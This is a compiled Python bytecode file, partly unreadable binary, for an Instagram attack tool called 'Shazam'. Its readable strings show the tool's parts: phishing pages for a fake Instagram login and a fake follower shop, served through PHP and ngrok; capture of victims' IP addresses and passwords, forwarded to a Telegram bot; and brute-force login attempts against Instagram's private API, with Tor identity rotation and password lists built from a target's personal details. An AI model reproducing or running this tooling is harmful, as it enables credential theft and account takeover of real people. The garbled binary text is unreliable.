# instacrck
U

    ���^!�  �                   @   s�  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dl
Z
d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dlmZ d dlmZ dd� Zdd� Ze� Zg Zdada da!d Z"d a#d a$g Z%d	Z&d a'd a(d a)da*d
a+da,g a-e �.� Z/g Z0g Z1d a2d a3d a4d a5dZ6g Z7da8e9d�Z:e�;e:�Z<e:�=�  d
Z>dd� Z?dd� Z@dd� ZAdd� ZBdd� ZCdd� ZDdd� ZEdd� ZFdd� ZGd d!� ZHd"d#� ZId$d%� Z:d&d'� ZJd(d)� ZKd*d+� ZLd,d-� ZMd.d/� ZNd0d1� ZOd2d3� ZPd4d5� ZQG d6d7� d7ejR�ZSd8d9� ZTd:d;� ZUd<d=� ZVd>d?� ZWd@dA� ZXG dBdC� dCejR�ZYdDdE� ZZdFdG� Z[dHdI� Z\dJdK� Z]dLdM� Z^dNdO� Z_dPdQ� Z`dRdS� Zazd dlbZbeceb�ddT�� W n> eek
�r�   e�fdU� Y n  egk
�r�   e�fdU� Y nX dS )V�    N)�Signal)�
Controller)�ngrokc                   C   s0   t jdkrt �d� nt jdkr,t �d� n d S )N�nt�cls�posix�clear)�os�name�system� r   r   �	shazam.pyr      s
    

r   c                   C   s.   t �� dkrdS t �� dkr dS t�d� d S )NZLinux�linuxZWindows�windowsz2
 [OSError] The operating system is not supported
)�platformr   �sys�exitr   r   r   r
   �check_os&   s
    r   � �   Fzconfig.jsonz@#$%&-()*"':;!?./_,~`|={}\[]c                    s(  g }t jdkrd}nt jdkr$d}n t|d�}|�� }|��  |dk�s&|�|� tD ]@}	d|	|f }
d||	f }|
|kr�|�|
� ||krV|�|� qV| dks�d| |f }
d|| f }|
|kr�|�|
� ||kr�|�|� |dk�s&d||f }
d||f }|
|k�r|�|
� ||k�r&|�|� | dk�s�|D ]�}	|	�� }	t|	�dk�rX|�|	� d| | f }d| |	f }
d|	| f }||k�r�t|�dk�r�|�|� |
|k�r�t|
�dk�r�|�|
� ||k�r4t|�dk�r4|�|� �q4|dk�s�d|| f }
d| |f }|
|k�r*t|
�dk�r*|�|
� ||k�rLt|�dk�rL|�|� |dk�svd	|| |f }
d	|| |f }d	||| f }
d	| ||f }d	|| |f }d	|| |f }|
|k�r�t|
�dk�r�|�|
� ||k�r�t|�dk�r�|�|� |
|k�rt|
�dk�r|�|
� ||k�r2t|�dk�r2|�|� ||k�rTt|�dk�rT|�|� ||k�rvt|�dk�rv|�|� |dk�s�d	|| |f }
d	|| |f }d	||| f }
d	| ||f }d	|| |f }d	|| |f }|
|k�r�t|
�dk�r�|�|
� ||k�rt|�dk�r|�|� |
|k�r:t|
�dk�r:|�|
� ||k�r\t|�dk�r\|�|� ||k�r~t|�dk�r~|�|� ||k�r�t|�dk�r�|�|� |dk�s�d||f }||k�r�t|�dk�r�|�|� t	j
� d�� fd
d�td�D ��}td
| d�}|�
d�|�� |��  d
| S )Nr   �wordlist\iran.txtr   �wordlist/iran.txt�rr   �%s%s�   z%s%s%sc                 3   s   | ]}t �� �V  qd S �N��randomZchoice��.0�i�Zlettersr   r
   �	<genexpr>�   s     z%password_generator.<locals>.<genexpr>�   �%s.txt�w�
)r	   r
   �open�	readlines�close�append�chart�strip�len�string�ascii_lowercase�join�range�write)�
first_name�	last_name�birthday�city�phone_number�
words_pass�password_list_path�o�
password_listr    �passwd_temp1�passwd_temp2Zpasswd_tempZpasswd_temp3Zpasswd_temp4Zpasswd_temp5Zpasswd_temp6�file_temp_passwd�
file_passwordr   r!   r
   �password_generatorZ   s�    





















































r@   c           
         s�   g }t jdkrd}nt jdkr$d}n t|d�}|�� }|��  |D ]`}|�� }d|| f }d| |f }t|�dkr�||kr�|�|� t|�dkrB||krB|�|� qBtj	� d�
� fd	d
�td�D ��}td| d
�}	|	�d�
|�� |	��  d| S )Nr   r   r   r   r   r   r   r   c                 3   s   | ]}t �� �V  qd S r   r   r   r!   r   r
   r"   �   s     z2by_user_password_list_generator.<locals>.<genexpr>r#   r$   r%   r&   )
r	   r
   r'   r(   r)   r,   r-   r*   r.   r/   r0   r1   r2   )
�userr8   r9   r:   r;   r    r<   r=   r>   r?   r   r!   r
   �by_user_password_list_generator�   s0    



rB   c                 C   sZ   zt | �}|W S  tk
r2   td� t��  Y n$ tk
rT   td� t��  Y nX d S )Nz
 [SIGINT] Bye .... z
 [EOF] Bye .... )�input�KeyboardInterrupt�printr   r   �EOFError)�textZcommand_userr   r   r
   �	raw_input�   s    rH   c                   C   s   dS )Na�  



                  .-~*~--,.   .-.
          .-~-. ./OOOOOOOOO\.'OOO`9~~-.
        .`OOOOOO.OOM.OLSONOOOOO@@OOOOOO\
       /OOOO@@@OO@@@OO@@@OOO@@@@@@@@OOOO`.
       |OO@@@WWWW@@@@OOWWW@WWWW@@@@@@@OOOO).
     .-'OO@@@@WW@@@W@WWWWWWWWOOWW@@@@@OOOOOO}
    /OOO@@O@@@@W@@@@@OOWWWWWOOWOO@@@OOO@@@OO|
   lOOO@@@OO@@@WWWWWWW\OWWWO\WWWOOOOOO@@@O.'
    \OOO@@@OOO@@@@@@OOW\     \WWWW@@@@@@@O'.
     `,OO@@@OOOOOOOOOOWW\     \WWWW@@@@@@OOO)
      \,O@@@@@OOOOOOWWWWW\     \WW@@@@@OOOO.'
        `~c~8~@@@@WWW@@W\       \WOO|\UO-~'
             (OWWWWWW@/\W\    ___\WO)
               `~-~''     \   \WW=*'
                         __\   \
        Shazam           \      \
                          \    __\
                           \  \
  https://ultrasec.org      \ \
  https://t.me/ultrasecurity \ \
                              \\
                               \\
                                \
                                 \
r   r   r   r   r
   �banner�   s    rI   c              	   C   s8   t |d��$}tjdddt| � g||d� W 5 Q R X d S )Nr%   �phpz-Szlocalhost:%s��stdout�stderr)r'   �
subprocess�Popen�str)�port�	file_name�phplogr   r   r
   �run_php_server  s    rT   c                 C   sX   z4t d dkst�t d � tjt| �d|d�}|W S    td| | f � Y dS X d S )NZngrok_tokenr   �http)�regionz@
 We couldn't run ngrok, please run it on port %s
	ngrok http %sr   )�
config_shazamr   Zset_auth_token�connect�intrE   )rQ   rV   �	ngrok_urlr   r   r
   �run_ngrok_server"  s    r[   c                 C   sF   d| ||f }|dddd�}zt �d|�}W n   td� Y nX d S )Nz=https://api.telegram.org/bot%s/sendmessage?chat_id=%s&text=%szMozilla FirefoxzHTTP/1.1ZPOST)ZUrlBoxZ	AgentListZVersionsListZ
MethodListz7https://www.httpdebugger.com/tools/ViewHttpHeaders.aspxz@ An error occurred while sending information to the Telegram bot)�requests�postrE   )�api_bot�user_id_telegram�messageZurl_api_telegramZpayloadZreqr   r   r
   �bot_send_message,  s    �ra   c              	   C   sb  t d� tjdkr@t| d��}tjdddg||d� W 5 Q R X n8tjdkrxt| d��}tjd	d
dg||d� W 5 Q R X n t��  td�}|�	� dks�|d
k�rNt�
d� t�
d� t�
d� tj�� }t
|j�}t
|j�}t
|j�}t
|j�}t
|j�}t
|j�}	d||||||	f }
t|
d�}|�d�t�� |��  t dt�� |
f � n t d� t��  d S )Nz Stoping process...r   r%   Ztskillz/ArJ   rK   r   Zkillallz-9zDo you want save logs??[Y,n] �Yr   z..Zlogsz shazam_log_%s-%s-%s_%s-%s-%s.txtr&   z Saved to %s as %sz

 Bye ...
)rE   r	   r
   r'   rN   rO   r   �killrH   �upper�chdir�datetime�nowrP   �year�month�day�hour�minute�secondr2   r0   �temp_data_showr)   �getcwdr   r   )rR   rS   �_�daterh   ri   rj   rk   rl   rm   Zfile_logr%   r   r   r
   �
close_session:  s6    
"
"




 
 
 
 
 

rr   c                  C   sb   t �  tt� � td�} | �� dks0| �� dkrBtd�}td�}nd}d}td }t|||� d S �Nz8Do you want to send information to telegram robot?[y,N] rb   �YESzApi telegram bot >> z7Your user id [ You can get help from @userinfobot ] >> r   Zphp_server_port)r   rE   rI   rH   rd   rW   �instagram_phishing_runner�Z
robot_commandZapi_telegramr_   rQ   r   r   r
   �phishingV  s    

rw   c              	   C   s  t t�d�j�tk�s
t t�d�j�atdd�}|�� }|tt|�� D ]�}|�	� }t
�d| �}|j}d|kr�dt
j
�� �� |f }nRt�|�}|d }	|d }
|d }|d	 }|d
 }
dt
j
�� �� ||
|	|||
f }t|� | dks�t| ||� t�|� qHt|�ad S )
N�
bLk87C_ip.txtr   �https://ipinfo.io/%s/json�error�[%s] IP: %s Opened link
rV   r6   �country�org�timezone�-[%s] IP: %s (%s, %s, %s, %s, %s) Opened link
r   �rP   r	   �stat�st_size�stat_file_ipr'   r(   �stat_file_ip_kr-   r,   r\   �getrG   rf   rg   �	isoformat�json�loadsrE   ra   rn   r*   �r^   r_   Zfile_ipZip_sr    �uZdata_ip�	text_send�	json_datarV   r6   r|   r}   r~   r   r   r
   �read_ipb  s,    

 r�   c              
   C   s�   t t�d�j�tks�t t�d�j�atdd�}|�� }|tt|�� D ]l}|�	� }|�
d�}dtj�� �
� |d |d d�|dd � �f }t|� | dks�t| ||� t�|� qFt|�ad S )	N�bLk87C_login.txtr   �-*-�J[%s] Login information:
     ip: %s
     username: %s
     password: %s 

r   r   �   r   �rP   r	   r�   r�   �stat_file_user_passr'   r(   �stat_file_user_pass_kr-   r,   �splitrf   rg   r�   r0   rE   ra   rn   r*   �r^   r_   Zfile_user_passZuser_pass_sr    rA   r�   r   r   r
   �read_user_pass}  s    

0r�   c                  C   s�   da dadadatj�d�rJt�d�jdks\t�	d� t
dd�} | ��  nt
dd�} | ��  tj�d�r�t�d�jdks�t�	d� t
dd�} | ��  nt
dd�} | ��  d S )Nr   r�   r%   rx   �r�   r�   r�   r�   r	   �path�isfiler�   r�   �remover'   r)   �r:   r   r   r
   �config_file�  s$    







r�   c                 C   s�   t jdkrd}nt jdkr d}n d}t �|� t| |� td� td }t| |�}|dksntd	� td
| � t�  td� zt||� t	||� W q| t
k
r�   t|� Y q| tk
r�   t|� Y q|X q|d S )Nr   ztemplate\instagramr   ztemplate/instagram�log� PHP server started ...�ngrok_regionr   � Ngrok service started ...�
 Public url: %s�&
 Use ctrl + c to stop the process...
)
r	   r
   re   rT   rE   rW   r[   r�   r�   r�   rD   rr   rF   �rQ   r^   r_   Zdir_insta_pathrR   rV   rZ   r   r   r
   ru   �  s,    





ru   c                  C   sb   t �  tt� � td�} | �� dks0| �� dkrBtd�}td�}nd}d}td }t|||� d S rs   )r   rE   rI   rH   rd   rW   �phishing_f_runnerrv   r   r   r
   �
phishing_f�  s    

r�   c              	   C   s  t t�d�j�tk�s
t t�d�j�atdd�}|�� }|tt|�� D ]�}|�	� }t
�d| �}|j}d|kr�dt
j
�� �� |f }nRt�|�}|d }	|d }
|d }|d	 }|d
 }
dt
j
�� �� ||
|	|||
f }t|� | dks�t| ||� t�|� qHt|�ad S )
N�
c1p90mmip.txtr   ry   rz   r{   rV   r6   r|   r}   r~   r   r   r�   r�   r   r   r
   �	read_ip_f�  s,    

 r�   c              
   C   s�   t t�d�j�tks�t t�d�j�atdd�}|�� }|tt|�� D ]l}|�	� }|�
d�}dtj�� �
� |d |d d�|dd � �f }t|� | dks�t| ||� t�|� qFt|�ad S )	N�c1p90mmlogin.txtr   r�   r�   r   r   r�   r   r�   r�   r   r   r
   �read_user_pass_f�  s    

0r�   c                  C   s�   da dadadatj�d�rJt�d�jdks\t�	d� t
dd�} | ��  nt
dd�} | ��  tj�d�r�t�d�jdks�t�	d� t
dd�} | ��  nt
dd�} | ��  d S )Nr   r�   r%   r�   r�   r�   r   r   r
   �
config_file_f   s$    







r�   c                 C   s�   t jdkrd}nt jdkr d}n d}t �|� t| |� td� td }t| |�}|dksntd	� td
| � t�  td� zt||� t	||� W q| t
k
r�   t|� Y q| tk
r�   t|� Y q|X q|d S )Nr   ztemplate\follower_buyr   ztemplate/follower_buyr�   r�   r�   r   r�   r�   r�   )
r	   r
   re   rT   rE   rW   r[   r�   r�   r�   rD   rr   rF   r�   r   r   r
   r�     s,    





r�   c                  C   sj   t �  tt� � td� td�} | �� dkr4t�  q| �� dkrHt�  q| �� dkr\t�  qtd� qd S )Nz^
	1) Instagram login page       2) Instagram followers purchase page
		               3) Back
�
Shazam:/# �1�2�3�+ Input is incomprehensible Please try again)r   rE   rI   rH   r,   rw   r�   �main��commandr   r   r
   �
phishing_aA  s    
r�   c                 C   s   dS �Nr   r   )�usernamer   r   r
   �isvalidT  s    r�   c                   @   s   e Zd Zdd� Zdd� ZdS )�myThreadc                 C   s4   t j�| � || _|| _|| _|| _|| _|| _d S r   )	�	threading�Thread�__init__�threadIDr
   �counter�fileName�lock1�lock2)�selfr�   r
   r�   r�   r�   r�   r   r   r
   r�   a  s    zmyThread.__init__c                 C   s   t | j| � d S r   )�
filereaderr�   �r�   r   r   r
   �runi  s    zmyThread.runN��__name__�
__module__�__qualname__r�   r�   r   r   r   r
   r�   `  s   r�   c                 C   sj   t | �D ]D}|�d�}|j��  t|�dkr6t�|� tt�dkrB|j��  q|j��  d}|j��  d S )Nr&   �   i�  r   )	r'   �rstripr�   �acquirer-   �buffr*   �releaser�   )r�   �thread�line�end_filer   r   r
   r�   k  s    



r�   c              
   C   s�   | dkrjz6t �t j|�d�d t|�d�d �� t jt_W dS  tk
rh } zt|� W 5 d }~X Y nX | dkr�z6t �t j	|�d�d t|�d�d �� t jt_W dS    Y dS X d S )N�socks5�:r   r   �socks4)
�socksZsetdefaultproxyZPROXY_TYPE_SOCKS5r�   rY   Z
socksocket�socket�	ExceptionrE   ZPROXY_TYPE_SOCKS4)�type�proxyrz   r   r   r
   �	proxy_setw  s    ((r�   c                  C   sb   t t�dks^t�� �d�} | d }| d }|dkrDt||�s^t�  n|dkr^t||�s^t�  n d S )Nr   � r   r�   r�   )r-   �
my_proxies�popr�   r�   �
proxy_handler)Zpro_xZ	type_proxr�   r   r   r
   r�   �  s    

r�   c              	   C   sv  t � � }tdkrt�  n>tdkrVt� dkr0d}nt� dkr@d}nd}d| d| d�}tt�t�d	���dd
� }tt�t�d	���dd� }tt�t�d	���dd� }tt�t�d	���dd
� }tt�t�d	���dd� }d�	|�}	d�	|||||�}
d�	|||||�}t
�� }tdk�r(||_|�
d�	|��aztjd }
W n   d}
Y nX ddddddd�}d}| j��  | j��  tdk�r�tt�dk�r�t��  | j��  | j��  td� �qrn| j��  | j��  | j��  tt�dk�r�| j��  n>t�d�}|�d�}d�|dd � �}|d | _| j��  �q>�q�| j��  | j��  tdk�rb||_|
|
| j||	|dd �}t� |�}t!�"|�#d!�|�#d!�t$j%��&� }t'j(�)|�}z&|j*d"|d#�	||�tjd$�}|j+}W n(   t�,dd%| j|f � Y �qnY nX d&|k�sd'|k�sd(|k�r^da-td)| j|f � d%| j|f tk�rnt�.d%| j|f � �qnd*|k�srd+|k�r�t/| j|d� n�d,|k�r�t/| j|d� n�d-|k�r�t/| j|d� n�d.|k�r�d/| j|f }t|� n�d0|k�rnt-�s�td1� da-tdk�r0t�  d%| j|f tk�rlt�,dd%| j|f � n<tdk�rnt0�  d%| j|f tk�rlt�,dd%| j|f � n n �qnd S )2Nr   r�   r   �Z#  r   �#  �socks5://localhost:%a�rU   Zhttps�    r�   �
   �   �   �"   �
android-{}�{}-{}-{}-{}-{}�Nhttps://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid={}�	csrftokenr   r)   �*/*�0application/x-www-form-urlencoded; charset=UTF-8�
$Version=1�en-US�YInstagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)�Z
ConnectionZAcceptzContent-typeZCookie2zAccept-Languagez
User-Agent�@4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178r   �&
		 Sorry, couldn't find the password.r�   �0�Zphone_idZ
_csrftokenr�   �guidZ	device_id�passwordZlogin_attempt_count�utf-8�.https://i.instagram.com/api/v1/accounts/login/�&ig_sig_key_version=4&signed_body={}.{}�ZurlZheaders�data�cookies�%s:%s�bad_password�invalid_user�%doesn't appear to belong to an accoun�% FAIL: username -> %s password -> %s �unusable_password�challenge_required�two_factor_required�logged_in_user�has been disabled�=

 The account is blocked: username -> "%s"  Password -> "%s"�few minutes�[-] Changing identity..)1�time�tor_proxy_statusr�   r   rP   �binascii�b2a_hexr	   �urandom�formatr\   �session�proxiesr�   �s1r�   r�   r�   r�   r�   r-   r�   r   r   r�   rE   r�   r�   r0   rA   �lock3r�   �dumps�hmac�new�encode�hashlib�sha256�	hexdigest�urllib�parse�quoter]   rG   �insert�tor_ider�   �get_detail_account�
change_tor)r�   �initial_timerQ   r  �hex4�hex8�hex12�hex16�uuid�device�phoner�   r  r�   �header�ig_sigr�   Zuir�   r�   �hmac_signed�
json_data_enc�resp�	resp_textr`   r   r   r
   �attack_combo�  s�    

�

















 







r0  c                 C   s$  t � � }tdkrt�  n>tdkrVt� dkr0d}nt� dkr@d}nd}d| d| d�}tt�t�d	���dd
� }tt�t�d	���dd� }tt�t�d	���dd� }tt�t�d	���dd
� }tt�t�d	���dd� }d�	|�}	d�	|||||�}
d�	|||||�}t
�� }tdk�r(||_|�
d�	|��aztjd }
W n   d}
Y nX ddddddd�}d}| j��  | j��  tdk�r�tt�dk�r�t��  | j��  | j��  td� �q n| j��  | j��  | j��  tt�dk�r�| j��  nt�d�}| j��  �q�q�| j��  | j��  tdk�r<||_t�rn|
|
| j||	|dd�}t�|�}t �!|�"d �|�"d �t#j$��%� }t&j'�(|�}z&|j)d!|d"�	||�tjd#�}|j*}W n   t�+d|� Y �qnY nX d$|k�s�d%|k�s�d&|k�r(da,td'| j|f � d(| j|f tk�rt�-|� n�d)|k�s<d*|k�rPdat.| j|d� n�d+|k�rndat.| j|d� n�d,|k�r�dat.| j|d� n�d-|k�r�d.| j|f }t|� nnd/|k�rnt,�s�td0� da,tdk�r�t�  |tk�rt�+d|� n(tdk�rt/�  |tk�rt�+d|� n n �qnd S )1Nr   r�   r   r�   r   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   r)   r�   r�   r�   r�   r�   r�   r�   r   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   r  r�   r  r  r  r  r  r  r  r	  )0r
  r  r�   r   rP   r  r
  r	   r  r  r\   r  r  r�   r  r�   r�   r�   r�   r�   r-   r�   r   r   r�   rE   r�   r  �successrA   r�   r  r  r  r  r  r  r  r  r  r  r]   rG   r  r  r�   r   r!  )r�   r"  rQ   r  r#  r$  r%  r&  r'  r(  r)  r�   r  r�   r*  r+  r�   r�   r�   r,  r-  r.  r/  r`   r   r   r
   �attack   s�    

�















 









r2  c                   @   s   e Zd Zdd� Zdd� ZdS )�myThreadConsumerc                 C   s:   t j�| � || _|| _|| _|| _|| _|| _|| _	d S r   )
r�   r�   r�   r�   r
   r�   r�   r�   r  rA   )r�   r�   r
   r�   Zlock1_Zlock2_Zlock3_rA   r   r   r
   r�   l  s    zmyThreadConsumer.__init__c                 C   s   t dkrt| � nt| � d S r�   )�attack_typer0  r2  r�   r   r   r
   r�   v  s    
zmyThreadConsumer.runNr�   r   r   r   r
   r3  k  s   
r3  c                 C   sl  z�d|  }t j�|�}t|�� �}|�d�d }|�d�d }|�d�d }|�d�}	|	d }
|�d�d	 }|�d�d }|�d�d }
|
�d�}|d }|dkr�d
| ||
|f }n|d	kr�d| ||
|f }n t|� tdkr�tt	d�}|�
|� |��  W nj   |dk�rd
| |f }n|d	k�r4d| |f }n t|� tdk�rbtt	d�}|�
|� |��  Y nX d S )Nzhttps://instagram.com/%sZfollowed_byr   �countz":�}r   Zedge_followr�   zW

 Successfull:
	 Username -> "%s"
	 Password -> "%s"
	 Followers: %s 
	 Following: %s
z}

 Password successfully found (two_factor_required):
	 Username -> "%s"
	 Password -> "%s"
	 Followers: %s 
	 Following: %s
�aze

 Successfull:
	 Username -> "%s"
	 Password -> "%s"
	 Followers: not found 
	 Following: not found
z|

 successfully (two_factor_required):
	 Username -> "%s"
	 Password -> "%s"
	 Followers: not found 
	 Following: not found
)r  ZrequestZurlopenrP   �readr�   rE   r4  r'   �file_log_combor2   r)   )r�   r�   r    Zurl_iZurl_openr.  ZamZal�vZghZ	followersZapZaqZzcZnmZ	followingr`   r:   r   r   r
   r   ~  sB    








r   c                 C   s�   ztt �dddd�}t�tjtj�}|�dt| �f� |�|� |��  t�tjtj�}|�dt|�f� |��  W dS  tj	k
r�   Y dS X d S )NZBBB�   r   r   Z	localhost)
�structZpackr�   ZAF_INETZSOCK_STREAMrX   rY   Zsendallr)   rz   )rQ   Z	port_ctrlr�   Zsocket_or   r   r
   �
tor_status�  s    
r=  c              
   C   s�   zxt dt| � � td g krBtjjt| �t|�dd�d�}W dS d}td D ]}d||f }qNd	| }t|� W dS W n4 tk
r� } zt d
| � W Y �dS d }~X Y nX d S )Nz Starting tor on port %sZ
bridge_torz{ru})Z	SocksPortZControlPortZ	ExitNodes)Zconfigr   r   z%s
	'Bridge':'%s',z�tor_process = stem.process.launch_tor_with_config(
	config = {
	'SocksPort': str(port),
	'ControlPort': str(c_port),
	'UseBridges':'1',%s
	'ExitNodes': '{ru}',
	})z%[-] Sorry we couldn't run the tor
	%s�again)rE   rP   rW   �stemZprocessZlaunch_tor_with_config�execr�   )rQ   Zc_portZtor_processZbridgesr    Zcommand_tor_startrz   r   r   r
   �	start_tor�  s&    ��
rA  c                  C   s`  t �  tt� � td� td�} | �� dkr�td� td�}dt�� krJn
t�d� tj�	|�rxda
td|� t�
�  ntd	| � td
� t�  q| �� dk�r<td� td
�}t|�s�td| � td
� t�  td� td� td� td� td� td
�}|dk�rttd� td
�}dt�� k�r.n
t�d� tj�	|��s`td| � td
� t�  t||� t�
�  n�|dk�r�td�}td�}td�}td�}td�}	td� t||||	|d�}
t||
� t�
�  nf|dk�rtjdk�r�td  }ntjd!k�r
td" }n t||� n$|d#k�rZtd� t|�}
t||
� q| �� dk�rRt�  qtd$� qd S )%Nz?
	1) Combo       2) Single username - Password list
		 3) Back
r�   r�   z"
Please enter the combo list file
zShazam:/comboList/# Zcombor   r7  z [ComboError] File %s not foundz Enter to continue...r�   z
Please enter the username
zShazam:/Single/# z/ [UserError] Username %s not found on instagramz.
Please select a method for the list password
z	1) Custom password listz0	2) Default password list [wordlist/default.txt]z8	3) Create a list password based on personal informationz-	4) Create a list password based on username
z%
Please enter the password list file
Zwordlistz  [PasswdError] File %s not foundr�   z
 First name[]: z Last name[]: z Phone number[]: z Year of Birth[]: z	 City[]: z?
 Generating password list
		This process may take a few moment)r3   r4   r5   r6   r7   r   Zdefault_wordlist_windowsr   Zdefault_wordlist_linux�4r�   )r   rE   rI   rH   r,   r	   ro   re   r�   r�   r4  �instagram_normal_runnerr   r   rC   �
bruteforcer�   r@   r
   rW   rB   r�   )r�   �
combo_listr�   Zcommand_methodr�   r3   r4   r7   r5   r6   Zfile_passwd_tempr9   r   r   r
   rD  �  s�    








�





rD  c                  C   s�  t dk�r�td� td�} | �� dkr�da td�}|�� dksJ|�� dkr�td	� td
�}tj�|�r�t|�D ]}t	�
d|� qnq�td| � td
� t�  n �n| �� dk�r�t
� dkr�d}d}nt
� dkr�d}d}nd}d}td� t||��s�td� t
� dk�rd}nt
� dk�r d}nd}t
� dk�rBtd� t�d� t||�}|dk�r�tdt|� � td�} | �� �� dk�s�| �� �� dk�r�t�  nda ntd� da ntd� da nda d S )Nr   zA 
 Would you like to use a proxy?

	 1) Proxy	 2) Tor
		 3) None
z	Shazam:/ r�   r   z-
 %sWould you like to use a proxy list?[y,N] rb   rt   z

 Please enter the proxy list file
  """ Example proxies inside a file:
	 socks5 213.28.19.14:8888
	 socks4 213.22.20.192:2332z
 proxylist > �����z! [ProxyError] File (%s) not foundz Enter to continue ...r�   r   r�   �[#  r   r�   �#  z Check tor service...
z$ We could not connect to the tor !!!z� You are running Windows
 And this script does not have the ability to activate the tour on Windows
 Please run tor browser and try again�

r>  z� Trouble running the tor
	Please make sure the internet is connected or control port is running on port %s and that no other tor is runningzTry again?[Y,n] �   z! Tor service set up successfully
r�   )r  rE   rH   r,   rd   r	   r�   r�   r'   r�   r  rC   �	get_proxyr   r=  r   r   rA  rP   )r�   Zproxy_lZproxy_list_filer�   rQ   Zport_c�port_controllerr7  r   r   r
   rK    s`    





$rK  c               	   C   sf   t � dkrd} nt � dkr d} nd} tj| d��,}|��  t�|�� d � |�tj	� W 5 Q R X d S )Nr   rG  r   rH  )rQ   �(   )
r   r   Z	from_portZauthenticater
  �sleepZget_newnym_wait�signalr   ZNEWNYM)rL  Z
controllerr   r   r
   r!  W  s    

r!  c                 C   sn  t �� at �� at �� at�  t�� }tdkr�d}tj�	� }t
|j�}t
|j�}t
|j
�}t
|j�}t
|j�}	t
|j�}
t� dkr�d|||||	|
f and|||||	|
f attd�}|��  td�t�� nd}tdd	d|tt�}g }
|��  t|�D ]0}|
�t|d
�|�|ttt| �� |
| ��  q�|��  t|�D ]}|
| ��  �q:td� tdt�� |  � d S )
Nr   �   r   z(../hits/shazam_log_%s-%s-%s_%s-%s-%s.txtz(..\hits\shazam_log_%s-%s-%s_%s-%s-%s.txtr%   z
 Saving to {}�   zThread-1z	Thread-{}z		 Exit main threadz		 in time: %s)r�   ZLockr�   r�   r  rK  r
  r4  rf   rg   rP   rh   ri   rj   rk   rl   rm   r   r9  r'   r)   rE   r  r�   �startr1   r*   r3  r0   )r�   rE  Z
start_timeZ
thread_numberrq   rh   ri   rj   rk   rl   rm   r:   Zthread1Zattack_threadsr    r   r   r
   rC  b  s@    

 
 
 
 
 


 rC  c                  C   sn   t �  tt� � td� td�} | �� dkr4t�  q| �� dkrHt�  q| �� dkr`t�d� qtd� qd S )Nz*
	1) Phishing    2) BruteForce
		 3) Exit
r�   r�   r�   r�   z
 [Exit] Bye ...
r�   )	r   rE   rI   rH   r,   r�   rD  r   r   r�   r   r   r
   r�   �  s    
r�   a�  aWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKCWlmIG5vdCBvcy5wYXRoLmlzZmlsZSgnLmxpY2Vuc2UnKToKCQlwcmludCgiIFBsZWFzZSBlbnRlciB0aGUgZmlsZSBwYXNzd29yZCIpCgkJcGFzc3dvcmRfc2NyaXB0ID0gZ2V0cGFzcy5nZXRwYXNzKCJwYXNzd29yZDogIikKCQlpZiBoYXNobGliLm1kNShoYXNobGliLnNoYTUxMihwYXNzd29yZF9zY3JpcHQuZW5jb2RlKCd1dGYtOCcpKS5oZXhkaWdlc3QoKS5lbmNvZGUoJ3V0Zi04JykpLmhleGRpZ2VzdCgpID09ICcxZjgxYTZlNzU0ZGZkMjk4ZmEwYmU3ZWExMjVlZjM0MCc6CgkJCXIgPSBvcGVuKCIubGljZW5zZSIsJ3cnKQoJCQliZW4gPSAiYWRhNGY2MTRjYzIyNmZlM2Y5NWI4ZWYzNDY5MzRiMTYzYWU2YjYxYzE3M2NhNzY4MzI5ZjQ4Yjg0MTliOWIwYzQ4NjY0YWM5OGU2ZGQ4NjdmN2ZkZjdkNzY1ZDMwOTU2ZDNmOTliNWMzOTZhYTI5MjhmMTIyNTQ0NmE1MjU2YmZcbjAzMDMxMWY4MTExMTI1MDg1OGE3OTBmMTc1ZmI3ODJmYTU5YWEyNzdkZDdkOGUxMjNkZGJjNTM1OTBlNDM3MWM1NjhkMzhiY2FiNjAyMTQ1MWIyZmI2YzVlYjY0NWFlNzIwMGExNjYxMjMyMTYwZDE5MjA2NmRkMmUzNTIyZjJmXG4lc1xuNzQ4MTkzZDcwOWY0ZDIzMzJkZWFjNDI0MzVmYmVkNTliMzVkN2U3ZjZjOTI1NmQ5OGIyZTBlN2M2ODcxMjAzNjFmZTM0ZmE3ZDQ2NmJlMmI3N2I2YWY3YmJhNGMxYzJiZTVmNDhmZDdjNGI2YTAxYzVmZWE2YWFiMzAxZWM4ZjAiJShoYXNobGliLmJsYWtlMnMoc3RyKHBsYXRmb3JtLnBsYXRmb3JtKCkpLmVuY29kZSgndXRmLTgnKSkuaGV4ZGlnZXN0KCkpCgkJCXIud3JpdGUoYmVuKQoJCQlyLmNsb3NlKCkKCQkJcHJpbnQoIiBUaGUgcGFzc3dvcmQgaXMgY29ycmVjdCIpCgkJCXByaW50KCIgVGhlIHNjcmlwdCB3aWxsIHJ1biBpbiBmaXZlIHNlY29uZHMuLi4iKQoJCQl0aW1lLnNsZWVwKDUpCgkJCW1haW4oKQoJCWVsc2U6CgkJCXN5cy5leGl0KCJcbiBUaGUgcGFzc3dvcmQgaXMgaW5jb3JyZWN0XG4gUGxlYXNlIGNoZWNrIHlvdXIgcGFzc3dvcmRcbiIpCgllbHNlOgoJCXIgPSBvcGVuKCcubGljZW5zZScsInIiKQoJCWxpY2Vuc2VfZGF0YSA9IHIucmVhZGxpbmVzKCkKCQlyLmNsb3NlKCkKCQlpZiBsZW4obGljZW5zZV9kYXRhKSA9PSA0OgoJCQlpZiBsaWNlbnNlX2RhdGFbMl0ucnN0cmlwKCkgPT0gaGFzaGxpYi5ibGFrZTJzKHN0cihwbGF0Zm9ybS5wbGF0Zm9ybSgpKS5lbmNvZGUoJ3V0Zi04JykpLmhleGRpZ2VzdCgpOgoJCQkJbWFpbigpCgkJCWVsc2U6CgkJCQlwcmludCgiIFBsZWFzZSBlbnRlciB0aGUgZmlsZSBwYXNzd29yZCIpCgkJCQlwYXNzd29yZF9zY3JpcHQgPSBnZXRwYXNzLmdldHBhc3MoInBhc3N3b3JkOiAiKQoJCQkJaWYgaGFzaGxpYi5tZDUoaGFzaGxpYi5zaGE1MTIocGFzc3dvcmRfc2NyaXB0LmVuY29kZSgndXRmLTgnKSkuaGV4ZGlnZXN0KCkuZW5jb2RlKCd1dGYtOCcpKS5oZXhkaWdlc3